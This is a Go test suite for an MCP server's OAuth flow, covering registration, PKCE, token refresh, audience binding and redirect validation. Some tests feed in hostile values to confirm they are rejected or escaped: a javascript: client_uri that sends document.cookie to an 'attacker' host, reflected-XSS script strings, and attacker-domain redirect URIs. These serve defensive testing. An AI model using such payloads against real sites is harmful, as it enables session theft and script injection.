package auth

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"html"
	"net/http"
	"net/http/httptest"
	"net/url"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/modelcontextprotocol/go-sdk/auth"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.lumeweb.com/oauth"
)

// testSecret is an arbitrary non-secret fixture value used only to exercise
// the OAuth flow in the test package. It is not a credential and never
// reaches production (the server secret always comes from the --auth-token
// flag at runtime).
const testSecret = "fixture-test-secret"

func newTestOAuth(t *testing.T) *OAuthServer {
	t.Helper()
	cfg := oauth.DefaultConfig()
	cfg.Issuer = "https://mcp.example.com/mcp"
	as, store, err := OpenOAuthStore(filepath.Join(t.TempDir(), "oauth.db"), cfg)
	require.NoError(t, err)
	o := NewOAuthServer(testSecret, "https://mcp.example.com", as, store)
	require.NoError(t, store.SaveClient(oauth.Client{
		ClientID:          "cli",
		RedirectURIs:      []string{"http://localhost/cb"},
		GrantTypes:        []string{"authorization_code", "refresh_token"},
		ResponseTypes:     []string{"code"},
		TokenEndpointAuth: "none",
		IsActive:          true,
	}))
	t.Cleanup(o.Stop) // stop the background reaper goroutine
	return o
}

func testPKCE() (verifier, challenge string) {
	verifier = "test-verifier-012345678901234567890123456789"
	sum := sha256.Sum256([]byte(verifier))
	return verifier, base64.RawURLEncoding.EncodeToString(sum[:])
}

func TestOAuthRegistration(t *testing.T) {
	o := newTestOAuth(t)
	rec := httptest.NewRecorder()
	body := strings.NewReader(`{"client_name":"ChatGPT","redirect_uris":["http://localhost:1455/callback"],"application_type":"native","token_endpoint_auth_method":"none"}`)
	req := httptest.NewRequest(http.MethodPost, "/oauth/register", body)
	req.Header.Set("Content-Type", "application/json")
	o.RegisterHandler(rec, req)
	assert.Equal(t, http.StatusCreated, rec.Code)
	var doc map[string]any
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&doc))
	assert.NotEmpty(t, doc["client_id"])
	assert.Equal(t, "none", doc["token_endpoint_auth_method"])

	// Registered HTTPS callbacks are valid for hosted clients.
	assert.True(t, oauth.AllowedClientRedirect("https://chatgpt.com/oauth/callback"))
}

func TestOAuthASMetadata(t *testing.T) {
	o := newTestOAuth(t)
	req := httptest.NewRequest(http.MethodGet, "/.well-known/oauth-authorization-server", nil)
	rec := httptest.NewRecorder()
	o.AsMetadataHandler(rec, req)
	assert.Equal(t, http.StatusOK, rec.Code)

	var doc map[string]any
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&doc))
	assert.Equal(t, "https://mcp.example.com", doc["issuer"])
	assert.Equal(t, "https://mcp.example.com/oauth/authorize", doc["authorization_endpoint"])
	assert.Equal(t, "https://mcp.example.com/oauth/token", doc["token_endpoint"])
	assert.Equal(t, "authorization_code", doc["grant_types_supported"].([]any)[0])
}

func TestOAuthProtectedResourceMetadata(t *testing.T) {
	o := newTestOAuth(t)
	o.RegisterMCPResource()
	req := httptest.NewRequest(http.MethodGet, "/.well-known/oauth-protected-resource", nil)
	rec := httptest.NewRecorder()
	o.ProtectedResourceHandler("/mcp")(rec, req)
	assert.Equal(t, http.StatusOK, rec.Code)

	var doc map[string]any
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&doc))
	assert.Equal(t, "https://mcp.example.com/mcp", doc["resource"])
	assert.Equal(t, []any{"https://mcp.example.com"}, doc["authorization_servers"])
	assert.Equal(t, []any{"offline_access"}, doc["scopes_supported"])
	assert.Equal(t, "Pinner MCP", doc["resource_name"])
}

func TestOAuthAuthorizeGET(t *testing.T) {
	o := newTestOAuth(t)
	_, challenge := testPKCE()
	req := httptest.NewRequest(http.MethodGet, "/oauth/authorize?response_type=code&client_id=cli&redirect_uri=http://localhost/cb&code_challenge="+challenge+"&code_challenge_method=S256&resource=https%3A%2F%2Fmcp.example.com%2Fmcp", nil)
	rec := httptest.NewRecorder()
	o.AuthorizeGET(rec, req)
	assert.Equal(t, http.StatusOK, rec.Code)
	body := rec.Body.String()
	assert.Contains(t, body, "auth secret")
	assert.Contains(t, body, "cli")
}

func TestOAuthAuthorizeGET_ClientURIValidHTTPSurfaced(t *testing.T) {
	o := newTestOAuth(t)
	require.NoError(t, o.store.SaveClient(oauth.Client{
		ClientID:          "uri-client",
		ClientURI:         "https://publisher.example/oauth-client.json",
		RedirectURIs:      []string{"http://localhost/cb"},
		GrantTypes:        []string{"authorization_code", "refresh_token"},
		ResponseTypes:     []string{"code"},
		TokenEndpointAuth: "none",
		IsActive:          true,
	}))
	_, challenge := testPKCE()
	u := "/oauth/authorize?response_type=code&client_id=uri-client" +
		"&redirect_uri=" + url.QueryEscape("http://localhost/cb") +
		"&code_challenge=" + challenge +
		"&code_challenge_method=S256" +
		"&resource=https%3A%2F%2Fmcp.example.com%2Fmcp"
	rec := httptest.NewRecorder()
	o.AuthorizeGET(rec, httptest.NewRequest(http.MethodGet, u, nil))
	require.Equal(t, http.StatusOK, rec.Code)
	// Only an absolute http(s) client_uri is rendered as a link.
	body := rec.Body.String()
	// The href keeps the full metadata URL; the link text is the domain and
	// carries the on-brand link color.
	assert.Contains(t, body, `href="https://publisher.example/oauth-client.json"`)
	assert.Contains(t, body, "Publisher:")
	assert.Contains(t, body, ">publisher.example</a>")
	assert.Contains(t, body, "brand-link")
	assert.NotContains(t, body, ">https://publisher.example/oauth-client.json</a>")
}

func TestClientURIHost(t *testing.T) {
	for _, tt := range []struct {
		in   string
		want string
	}{
		{"https://publisher.example/oauth-client.json", "publisher.example"},
		{"https://www.mcpjam.com/.well-known/oauth/client-metadata.json", "www.mcpjam.com"},
		{"http://mcp.example:8080/md", "mcp.example:8080"},
		{"", ""},
		{"not a url", ""},
	} {
		if got := clientURIHost(tt.in); got != tt.want {
			t.Errorf("clientURIHost(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

func TestOAuthAuthorizeGET_ClientURISchemeRejected(t *testing.T) {
	o := newTestOAuth(t)
	// A hostile client_uri must never reach the authorize page href, whether
	// as a javascript:/data: scheme, a relative URL, or a scheme-less value.
	for _, uri := range []string{
		"javascript:fetch('//attacker/'+document.cookie)",
		"data:text/html,<script>alert(1)</script>",
		"//host/path",
		"not-a-url",
	} {
		require.NoError(t, o.store.SaveClient(oauth.Client{
			ClientID:          "evil-client",
			ClientURI:         uri,
			RedirectURIs:      []string{"http://localhost/cb"},
			GrantTypes:        []string{"authorization_code", "refresh_token"},
			ResponseTypes:     []string{"code"},
			TokenEndpointAuth: "none",
			IsActive:          true,
		}))
		_, challenge := testPKCE()
		u := "/oauth/authorize?response_type=code&client_id=evil-client" +
			"&redirect_uri=" + url.QueryEscape("http://localhost/cb") +
			"&code_challenge=" + challenge +
			"&code_challenge_method=S256" +
			"&resource=https%3A%2F%2Fmcp.example.com%2Fmcp"
		rec := httptest.NewRecorder()
		o.AuthorizeGET(rec, httptest.NewRequest(http.MethodGet, u, nil))
		require.Equal(t, http.StatusOK, rec.Code)
		body := rec.Body.String()
		assert.NotContains(t, body, "Publisher:", "client_uri %q must not be surfaced", uri)
		assert.NotContains(t, body, uri, "client_uri %q must not appear in the page", uri)
	}
}

func TestOAuthAuthorizeGET_ReflectedXSSEscaped(t *testing.T) {
	o := newTestOAuth(t)
	_, challenge := testPKCE()
	// state is an opaque, unvalidated OAuth param that is echoed verbatim into
	// a hidden input. A malicious client driving a resource owner to this page
	// can set state to markup; it must render HTML-escaped so it cannot break
	// out of the hidden-input attribute. redirect_uri is left valid because it
	// is validated against the registered client.
	evil := `"><script>alert(1)</script>`
	u := "/oauth/authorize?response_type=code&client_id=cli" +
		"&redirect_uri=" + url.QueryEscape("http://localhost/cb") +
		"&code_challenge=" + challenge +
		"&code_challenge_method=S256" +
		"&state=" + url.QueryEscape(evil) +
		"&resource=https%3A%2F%2Fmcp.example.com%2Fmcp"
	rec := httptest.NewRecorder()
	o.AuthorizeGET(rec, httptest.NewRequest(http.MethodGet, u, nil))
	require.Equal(t, http.StatusOK, rec.Code)
	body := rec.Body.String()
	// The raw markup must not survive into the page: templ's attribute
	// escaping encodes both the quote and the angle brackets.
	assert.NotContains(t, body, "<script>alert(1)</script>")
	assert.NotContains(t, body, `"><script>`)
	// The hidden input must render the original value entity-escaped so that a
	// browser decodes it back to the exact state (XSS-safe AND lossless
	// round-trip: html.EscapeString escapes the quote, so the escaped text is
	// the original with each of its metacharacters entity-encoded).
	assert.Contains(t, body, `name="state" value="`+html.EscapeString(evil)+`"`)
	// Round-trip: decoding the entity-escaped attribute value yields the
	// original state the server must echo on POST.
	escaped := html.EscapeString(evil)
	assert.Equal(t, evil, html.UnescapeString(escaped))
}

func TestOAuthAuthorizeGET_InvalidCodeChallengeRejected(t *testing.T) {
	o := newTestOAuth(t)
	// A code_challenge that is not plain base64url (RFC 7636) must be rejected
	// so attacker markup cannot reach the authorize page.
	bad := `"><script>alert(1)</script>`
	u := "/oauth/authorize?response_type=code&client_id=cli" +
		"&redirect_uri=" + url.QueryEscape("http://localhost/cb") +
		"&code_challenge=" + url.QueryEscape(bad) +
		"&code_challenge_method=S256" +
		"&state=abc" +
		"&resource=https%3A%2F%2Fmcp.example.com%2Fmcp"
	rec := httptest.NewRecorder()
	o.AuthorizeGET(rec, httptest.NewRequest(http.MethodGet, u, nil))
	assert.Equal(t, http.StatusBadRequest, rec.Code)
}

func TestOAuthFullFlow(t *testing.T) {
	o := newTestOAuth(t)

	// Resource server: unauthenticated request must 401 with a challenge
	// pointing at the protected-resource metadata.
	inner := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusOK) })
	protected := o.protectMCP("/mcp", inner)

	rec := httptest.NewRecorder()
	protected.ServeHTTP(rec, httptest.NewRequest(http.MethodPost, "/mcp", nil))
	assert.Equal(t, http.StatusUnauthorized, rec.Code)
	assert.Contains(t, rec.Header().Get("WWW-Authenticate"), "resource_metadata=")
	assert.Contains(t, rec.Header().Get("WWW-Authenticate"), "oauth-protected-resource")
	// Invalid bearer token also rejected.
	rec = httptest.NewRecorder()
	bad := httptest.NewRequest(http.MethodPost, "/mcp", nil)
	bad.Header.Set("Authorization", "Bearer notissued")
	protected.ServeHTTP(rec, bad)
	assert.Equal(t, http.StatusUnauthorized, rec.Code)

	// Authorization: wrong secret-as-password is rejected with a 401, and the
	// response is a branded retry form page (not a bare text/JSON body) so a
	// human who mistyped the shared secret can try again.
	rec = httptest.NewRecorder()
	o.AuthorizePOST(rec, formPost(map[string]string{
		"client_id": "cli", "redirect_uri": "http://localhost/cb",
		"state": "st", "password": "wrong",
	}))
	assert.Equal(t, http.StatusUnauthorized, rec.Code)
	assert.Contains(t, rec.Header().Get("Content-Type"), "text/html")
	assert.Contains(t, rec.Body.String(), "Invalid auth secret")
	assert.Contains(t, rec.Body.String(), "name=\"password\"")
	assert.Contains(t, rec.Body.String(), "action=")
	// The retry form must preserve the authorize request so resubmission works.
	assert.Contains(t, rec.Body.String(), `name="client_id"`)

	// Correct secret-as-password issues a PKCE-bound code and redirects.
	verifier, challenge := testPKCE()
	authValues := map[string]string{
		"response_type": "code", "client_id": "cli", "redirect_uri": "http://localhost/cb",
		"state": "st", "password": testSecret, "code_challenge": challenge,
		"code_challenge_method": "S256", "resource": "https://mcp.example.com/mcp",
	}
	rec = httptest.NewRecorder()
	o.AuthorizePOST(rec, formPost(authValues))
	assert.Equal(t, http.StatusFound, rec.Code)
	loc, err := url.Parse(rec.Header().Get("Location"))
	require.NoError(t, err)
	code := loc.Query().Get("code")
	require.NotEmpty(t, code)
	assert.Equal(t, "st", loc.Query().Get("state"))
	assert.Equal(t, "http://localhost/cb", loc.Scheme+"://"+loc.Host+loc.Path)

	// A second authorization produces a different one-time code.
	rec = httptest.NewRecorder()
	o.AuthorizePOST(rec, formPost(authValues))
	loc2, _ := url.Parse(rec.Header().Get("Location"))
	code2 := loc2.Query().Get("code")
	require.NotEqual(t, code, code2)

	// Token endpoint: exchange the (single-use) code for an access token.
	rec = httptest.NewRecorder()
	o.TokenHandler(rec, formPost(map[string]string{
		"grant_type":    "authorization_code",
		"code":          code,
		"client_id":     "cli",
		"redirect_uri":  "http://localhost/cb",
		"code_verifier": verifier,
		"resource":      "https://mcp.example.com/mcp",
	}))
	assert.Equal(t, http.StatusOK, rec.Code)
	var tok map[string]any
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&tok))
	access := tok["access_token"].(string)
	require.NotEmpty(t, access)
	assert.Equal(t, "Bearer", tok["token_type"])
	refresh := tok["refresh_token"].(string)
	require.NotEmpty(t, refresh)

	// Refresh token rotates into a new access token.
	rec = httptest.NewRecorder()
	o.TokenHandler(rec, formPost(map[string]string{
		"grant_type": "refresh_token", "refresh_token": refresh,
	}))
	assert.Equal(t, http.StatusOK, rec.Code)

	// The issued token authorizes the MCP endpoint and binds the transport session.
	var userID string
	bound := o.OfficialMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		info := auth.TokenInfoFromContext(r.Context())
		require.NotNil(t, info)
		userID = info.UserID
		w.WriteHeader(http.StatusOK)
	}))

	// The official middleware rejects requests without a bearer token.
	rec = httptest.NewRecorder()
	bound.ServeHTTP(rec, httptest.NewRequest(http.MethodPost, "/mcp", nil))
	assert.Equal(t, http.StatusUnauthorized, rec.Code)
	assert.Contains(t, rec.Header().Get("WWW-Authenticate"), "resource_metadata=")

	// Invalid or expired tokens cannot reach the MCP handler.
	rec = httptest.NewRecorder()
	bad = httptest.NewRequest(http.MethodPost, "/mcp", nil)
	bad.Header.Set("Authorization", "Bearer notissued")
	bound.ServeHTTP(rec, bad)
	assert.Equal(t, http.StatusUnauthorized, rec.Code)
	assert.Contains(t, rec.Header().Get("WWW-Authenticate"), "resource_metadata=")

	// A valid token authorizes the request and preserves the principal.
	rec = httptest.NewRecorder()
	good := httptest.NewRequest(http.MethodPost, "/mcp", nil)
	good.Header.Set("Authorization", "Bearer "+access)
	bound.ServeHTTP(rec, good)
	assert.Equal(t, http.StatusOK, rec.Code)
	assert.Equal(t, tokenPrincipal(access), userID)
}

func TestOAuthTokenRejectsBadGrant(t *testing.T) {
	o := newTestOAuth(t)
	rec := httptest.NewRecorder()
	o.TokenHandler(rec, formPost(map[string]string{"grant_type": "authorization_code", "code": "nope"}))
	assert.Equal(t, http.StatusBadRequest, rec.Code)
}

// TestOAuthMiddlewareEnhanced401 verifies the bearer middleware emits a full
// RFC 6750 invalid_token challenge (error attribute in the WWW-Authenticate
// header plus a JSON body) rather than the SDK's bare resource_metadata
// challenge + plain-text body. Connectors that do not transparently refresh
// (Grok's rmcp) key off the error attribute to decide to refresh instead of
// treating the 401 as fatal.
func TestOAuthMiddlewareEnhanced401(t *testing.T) {
	o := newTestOAuth(t)
	inner := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		require.NotNil(t, auth.TokenInfoFromContext(r.Context()), "valid token must bind TokenInfo for the SDK session seam")
		w.WriteHeader(http.StatusOK)
	})
	bound := o.OfficialMiddleware(inner)

	for name, req := range map[string]*http.Request{
		"missing": httptest.NewRequest(http.MethodPost, "/mcp", nil),
		"invalid": func() *http.Request {
			r := httptest.NewRequest(http.MethodPost, "/mcp", nil)
			r.Header.Set("Authorization", "Bearer notissued")
			return r
		}(),
	} {
		rec := httptest.NewRecorder()
		bound.ServeHTTP(rec, req)

		assert.Equal(t, http.StatusUnauthorized, rec.Code, name)
		challenge := rec.Header().Get("WWW-Authenticate")
		assert.Contains(t, challenge, "resource_metadata=", name)
		assert.Contains(t, challenge, "oauth-protected-resource", name)
		assert.Contains(t, challenge, `error="invalid_token"`, name)

		assert.Equal(t, "application/json", rec.Header().Get("Content-Type"), name)
		var body map[string]string
		require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &body), name)
		assert.Equal(t, "invalid_token", body["error"], name)
		// No trailing plain-text bytes may leak past the JSON body (a malformed
		// "{...}text" body would fail the Unmarshal above regardless).
	}
}

// TestOAuthChallengeWriterUnwrap verifies the enhanced-401 writer exposes the
// underlying ResponseWriter, so http.NewResponseController can reach the real
// http.Flusher. Without it the standalone SSE stream (GET) path stalls behind
// OAuth with http.ErrNotSupported.
func TestOAuthChallengeWriterUnwrap(t *testing.T) {
	rec := httptest.NewRecorder()
	w := &oauthChallengeWriter{ResponseWriter: rec}
	if got := w.Unwrap(); got != http.ResponseWriter(rec) {
		t.Fatalf("Unwrap() = %T, want %T", got, rec)
	}
}

// TestOAuthMiddlewareFlushReachable drives a valid-token request through the
// enhanced-401 middleware and confirms the handler can still Flush the SSE
// stream via http.NewResponseController. This is the SSE path Kody flagged:
// without Unwrap, Flush behind OAuth returns http.ErrNotSupported.
func TestOAuthMiddlewareFlushReachable(t *testing.T) {
	o := newTestOAuth(t)
	access := "valid-token-for-flush"
	require.NoError(t, o.store.SaveAccessToken(oauth.AccessToken{
		Token: access, ClientID: "cli", UserID: 0, Resource: o.mcpResourceURL(), ExpiresAt: time.Now().Add(time.Hour),
	}))

	var flushErr error
	bound := o.OfficialMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		rc := http.NewResponseController(w)
		flushErr = rc.Flush()
		w.WriteHeader(http.StatusOK)
	}))
	req := httptest.NewRequest(http.MethodPost, "/mcp", nil)
	req.Header.Set("Authorization", "Bearer "+access)
	rec := httptest.NewRecorder()
	bound.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	assert.NoError(t, flushErr, "Flush must succeed on the valid-token path (SSE must not stall)")
}

// TestOAuthMiddlewareAudienceBinding confirms RFC 8707 audience binding: a
// token minted for a different MCP resource must be rejected even though it is
// valid and unexpired, and a token bound to this MCP resource passes.
func TestOAuthMiddlewareAudienceBinding(t *testing.T) {
	o := newTestOAuth(t)

	t.Run("wrong resource rejected", func(t *testing.T) {
		require.NoError(t, o.store.SaveAccessToken(oauth.AccessToken{
			Token: "other-mcp", ClientID: "cli", UserID: 0,
			Resource: "https://other.example.com/mcp", ExpiresAt: time.Now().Add(time.Hour),
		}))
		bound := o.OfficialMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
		}))
		req := httptest.NewRequest(http.MethodPost, "/mcp", nil)
		req.Header.Set("Authorization", "Bearer other-mcp")
		rec := httptest.NewRecorder()
		bound.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusUnauthorized, rec.Code)
	})

	t.Run("correct resource authorized", func(t *testing.T) {
		require.NoError(t, o.store.SaveAccessToken(oauth.AccessToken{
			Token: "right-mcp", ClientID: "cli", UserID: 0,
			Resource: o.mcpResourceURL(), ExpiresAt: time.Now().Add(time.Hour),
		}))
		bound := o.OfficialMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
		}))
		req := httptest.NewRequest(http.MethodPost, "/mcp", nil)
		req.Header.Set("Authorization", "Bearer right-mcp")
		rec := httptest.NewRecorder()
		bound.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusOK, rec.Code)
	})
}

// TestOAuthMiddlewareDownstream401Untouched confirms a downstream handler's
// own 401 (one that does not carry a bearer challenge) passes through the
// enhanced-401 writer with its original status, body, and content type — it
// must NOT be relabeled as an invalid_token OAuth challenge.
func TestOAuthMiddlewareDownstream401Untouched(t *testing.T) {
	o := newTestOAuth(t)
	require.NoError(t, o.store.SaveAccessToken(oauth.AccessToken{
		Token: "ok", ClientID: "cli", UserID: 0, Resource: o.mcpResourceURL(), ExpiresAt: time.Now().Add(time.Hour),
	}))

	// A valid bearer passes the auth gate; the downstream handler then returns
	// its own non-OAuth 401 (e.g. an inner resource rejecting for its own
	// reason). Because it never sets a Bearer WWW-Authenticate challenge, it
	// must pass through untouched.
	bound := o.OfficialMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		http.Error(w, "resource level failure", http.StatusUnauthorized)
	}))
	req := httptest.NewRequest(http.MethodPost, "/mcp", nil)
	req.Header.Set("Authorization", "Bearer ok")
	rec := httptest.NewRecorder()
	bound.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusUnauthorized, rec.Code)
	assert.NotContains(t, rec.Header().Get("WWW-Authenticate"), "invalid_token")
	assert.Contains(t, rec.Body.String(), "resource level failure")
	assert.NotContains(t, rec.Body.String(), `"error"`)
}

// TestOAuthMiddleware401ContentLengthCleared verifies the stale Content-Length
// sized for the wrapped plain-text body is cleared when the 401 is upgraded to
// JSON, so the response is not truncated to the shorter JSON body.
func TestOAuthMiddleware401ContentLengthCleared(t *testing.T) {
	o := newTestOAuth(t)
	bound := o.OfficialMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodPost, "/mcp", nil)
	rec := httptest.NewRecorder()
	bound.ServeHTTP(rec, req)
	assert.Equal(t, http.StatusUnauthorized, rec.Code)

	assert.Equal(t, "application/json", rec.Header().Get("Content-Type"))
	var body map[string]string
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &body))
	assert.Equal(t, "invalid_token", body["error"])
	// The body must parse exactly; any stale Content-Length must equal the
	// actual JSON byte length (the wrapped plain-text body was shorter).
	if cl := rec.Header().Get("Content-Length"); cl != "" {
		want := len(rec.Body.String())
		got, err := strconv.Atoi(cl)
		require.NoError(t, err)
		assert.Equal(t, want, got, "Content-Length must match the emitted JSON body")
	}
}

// TestOAuthMiddleware401DoesNotBreakValidTokens confirms a valid token still
// reaches the handler with TokenInfo bound despite the enhanced-401 writer,
// so the SDK session user-binding keeps working.
func TestOAuthMiddleware401DoesNotBreakValidTokens(t *testing.T) {
	o := newTestOAuth(t)
	verifier, challenge := testPKCE()
	const res = "https://mcp.example.com/mcp"

	rec := httptest.NewRecorder()
	o.AuthorizePOST(rec, formPost(map[string]string{
		"response_type": "code", "client_id": "cli", "redirect_uri": "http://localhost/cb",
		"password": testSecret, "code_challenge": challenge, "code_challenge_method": "S256", "resource": res,
	}))
	require.Equal(t, http.StatusFound, rec.Code)
	loc, _ := url.Parse(rec.Header().Get("Location"))
	code := loc.Query().Get("code")
	require.NotEmpty(t, code)

	rec = httptest.NewRecorder()
	o.TokenHandler(rec, formPost(map[string]string{
		"grant_type": "authorization_code", "code": code, "client_id": "cli",
		"redirect_uri": "http://localhost/cb", "code_verifier": verifier, "resource": res,
	}))
	require.Equal(t, http.StatusOK, rec.Code)
	var tok map[string]any
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &tok))
	access := tok["access_token"].(string)

	bound := o.OfficialMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		info := auth.TokenInfoFromContext(r.Context())
		require.NotNil(t, info)
		w.WriteHeader(http.StatusOK)
	}))
	req := httptest.NewRequest(http.MethodPost, "/mcp", nil)
	req.Header.Set("Authorization", "Bearer "+access)
	rec = httptest.NewRecorder()
	bound.ServeHTTP(rec, req)
	assert.Equal(t, http.StatusOK, rec.Code)
}

func TestAllowedClientRedirect(t *testing.T) {
	for _, ok := range []string{
		"http://localhost/cb",
		"http://127.0.0.1:8080/cb",
		"http://localhost:3000/cb?x=1",
		"https://localhost/cb",
		"https://evil.example.net", // any HTTPS callback is allowed for hosted clients
	} {
		assert.True(t, oauth.AllowedClientRedirect(ok), "expected allowed: %s", ok)
	}
	for _, bad := range []string{
		"http://attacker.com/cb", // loopback-only for plain HTTP
		"ftp://localhost/cb",
		"javascript:alert(1)",
		"not a url",
	} {
		assert.False(t, oauth.AllowedClientRedirect(bad), "expected rejected: %s", bad)
	}
}

func TestOAuthRejectsCrossHostRedirect(t *testing.T) {
	o := newTestOAuth(t)
	rec := httptest.NewRecorder()
	o.AuthorizePOST(rec, formPost(map[string]string{
		"client_id": "evil", "redirect_uri": "http://attacker.com/cb",
		"state": "st", "password": testSecret,
	}))
	assert.Equal(t, http.StatusBadRequest, rec.Code)
	assert.NotContains(t, rec.Body.String(), "code=")
}

func TestOAuthReapExpired(t *testing.T) {
	o := newTestOAuth(t)
	// Persist an expired code and access token directly, as a long-running
	// server would leave them for the reaper.
	require.NoError(t, o.store.SaveCode(oauth.AuthorizationCode{
		Code: "expiredcode", ClientID: "cli", UserID: 0, ExpiresAt: time.Now().Add(-time.Second),
	}))
	require.NoError(t, o.store.SaveAccessToken(oauth.AccessToken{
		Token: "expiredtok", ClientID: "cli", UserID: 0, ExpiresAt: time.Now().Add(-time.Second),
	}))

	o.reapLocked()

	_, err := o.store.GetCode("expiredcode")
	assert.True(t, errors.Is(err, oauth.ErrCodeNotFound), "expired code should be reaped")
	_, err = o.store.GetAccessToken("expiredtok")
	assert.True(t, errors.Is(err, oauth.ErrTokenNotFound), "expired token should be reaped")
	assert.False(t, o.validToken("expiredtok"))
	assert.False(t, o.validToken("nevertissued"))
}

func TestStaticBearerMiddleware(t *testing.T) {
	inner := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusOK) })
	h := StaticBearerMiddleware(testSecret, inner)

	// Missing token -> 401.
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/mcp", nil))
	assert.Equal(t, http.StatusUnauthorized, rec.Code)

	// Wrong token -> 401.
	rec = httptest.NewRecorder()
	bad := httptest.NewRequest(http.MethodGet, "/mcp", nil)
	bad.Header.Set("Authorization", "Bearer wrong")
	h.ServeHTTP(rec, bad)
	assert.Equal(t, http.StatusUnauthorized, rec.Code)

	// Correct token -> 200.
	rec = httptest.NewRecorder()
	good := httptest.NewRequest(http.MethodGet, "/mcp", nil)
	good.Header.Set("Authorization", "Bearer "+testSecret)
	h.ServeHTTP(rec, good)
	assert.Equal(t, http.StatusOK, rec.Code)
}

func formPost(values map[string]string) *http.Request {
	form := url.Values{}
	for k, v := range values {
		form.Set(k, v)
	}
	req := httptest.NewRequest(http.MethodPost, "/", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	return req
}

func TestASMetadataAdvertisesCIMD(t *testing.T) {
	o := newTestOAuth(t)
	req := httptest.NewRequest(http.MethodGet, "/.well-known/oauth-authorization-server", nil)
	rec := httptest.NewRecorder()
	o.AsMetadataHandler(rec, req)
	require.Equal(t, http.StatusOK, rec.Code)

	var doc map[string]any
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&doc))
	assert.Equal(t, true, doc["client_id_metadata_document_supported"])
	assert.Contains(t, doc["token_endpoint_auth_methods_supported"].([]any), "none")
}

func TestMatchRedirectURI_LoopbackPortAgnostic(t *testing.T) {
	tests := []struct {
		name       string
		registered []string
		requested  string
		want       bool
	}{
		{
			name:       "loopback different port accepted",
			registered: []string{"http://localhost/callback"},
			requested:  "http://localhost:61264/callback",
			want:       true,
		},
		{
			name:       "loopback 127.0.0.1 different port",
			registered: []string{"http://127.0.0.1/callback"},
			requested:  "http://127.0.0.1:8080/callback",
			want:       true,
		},
		{
			name:       "loopback exact match",
			registered: []string{"http://localhost/callback"},
			requested:  "http://localhost/callback",
			want:       true,
		},
		{
			name:       "loopback different path rejected",
			registered: []string{"http://localhost/callback"},
			requested:  "http://localhost:8080/different",
			want:       false,
		},
		{
			name:       "non-loopback exact match required",
			registered: []string{"https://claude.ai/api/mcp/auth_callback"},
			requested:  "https://claude.ai/api/mcp/auth_callback",
			want:       true,
		},
		{
			name:       "non-loopback different host rejected",
			registered: []string{"https://claude.ai/api/mcp/auth_callback"},
			requested:  "https://evil.com/api/mcp/auth_callback",
			want:       false,
		},
		{
			name:       "loopback different scheme rejected",
			registered: []string{"http://localhost/callback"},
			requested:  "https://localhost:8080/callback",
			want:       false,
		},
		{
			name:       "empty registered",
			registered: []string{},
			requested:  "http://localhost/callback",
			want:       false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.want, oauth.MatchRedirectURI(tt.registered, tt.requested))
		})
	}
}

// TestOAuthRefreshReuseTolerated guards the Anthropic Claude failure mode: the
// connector can re-present the same refresh token while it persists the
// rotated successor. With the durable store's reuse-detection window, that
// re-presentation is accepted (not invalid_grant), so the session stays alive.
func TestOAuthRefreshReuseTolerated(t *testing.T) {
	o := newTestOAuth(t)
	verifier, challenge := testPKCE()

	// Complete an authorization-code flow to mint a refresh token.
	const res = "https://mcp.example.com/mcp"
	rec := httptest.NewRecorder()
	o.AuthorizePOST(rec, formPost(map[string]string{
		"response_type": "code", "client_id": "cli", "redirect_uri": "http://localhost/cb",
		"password": testSecret, "code_challenge": challenge, "code_challenge_method": "S256", "resource": res,
	}))
	require.Equal(t, http.StatusFound, rec.Code)
	loc, _ := url.Parse(rec.Header().Get("Location"))
	code := loc.Query().Get("code")

	rec = httptest.NewRecorder()
	o.TokenHandler(rec, formPost(map[string]string{
		"grant_type": "authorization_code", "code": code, "client_id": "cli",
		"redirect_uri": "http://localhost/cb", "code_verifier": verifier, "resource": res,
	}))
	require.Equal(t, http.StatusOK, rec.Code)
	var tok map[string]any
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&tok))
	refresh := tok["refresh_token"].(string)
	require.NotEmpty(t, refresh)

	// First refresh use rotates.
	rec = httptest.NewRecorder()
	o.TokenHandler(rec, formPost(map[string]string{"grant_type": "refresh_token", "refresh_token": refresh}))
	require.Equal(t, http.StatusOK, rec.Code, "first refresh must succeed")

	// Re-presenting the SAME refresh token immediately (within the reuse
	// window) must also succeed — this is what previously returned invalid_grant
	// and broke the Claude connection.
	rec = httptest.NewRecorder()
	o.TokenHandler(rec, formPost(map[string]string{"grant_type": "refresh_token", "refresh_token": refresh}))
	require.Equal(t, http.StatusOK, rec.Code, "benign refresh-token reuse within the window must not invalid_grant")
}

